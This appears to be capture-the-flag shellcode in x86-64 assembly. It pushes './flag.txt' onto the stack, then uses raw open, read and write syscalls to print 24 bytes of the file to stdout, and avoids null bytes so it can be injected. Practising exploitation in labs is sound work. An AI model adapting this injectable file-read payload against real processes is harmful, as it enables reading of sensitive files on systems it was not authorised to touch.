global _start
section .text
_start:
	; push './flag.txt\x00'
	xor sil,sil
	push si
	mov di, 'xt'
	push di ; push NULL string terminator
	mov rdi, './flag.t'
	push rdi
	; open('rsp', 'O_RDONLY')
	mov al, 2 ; open syscall number
	mov rdi, rsp ; move pointer to filename
	syscall
	; read file
	lea rsi, [rdi] ; pointer to opened file
	mov rdi, rax ; set fd to rax from open syscall
	xor al, al ; read syscall number
	mov dl, 24 ; size to read
	syscall
	; write output
	mov al, 1 ; write syscall
	mov dil, 1 ; set fd to stdout
	mov dl, 24 ; size to read
	syscall
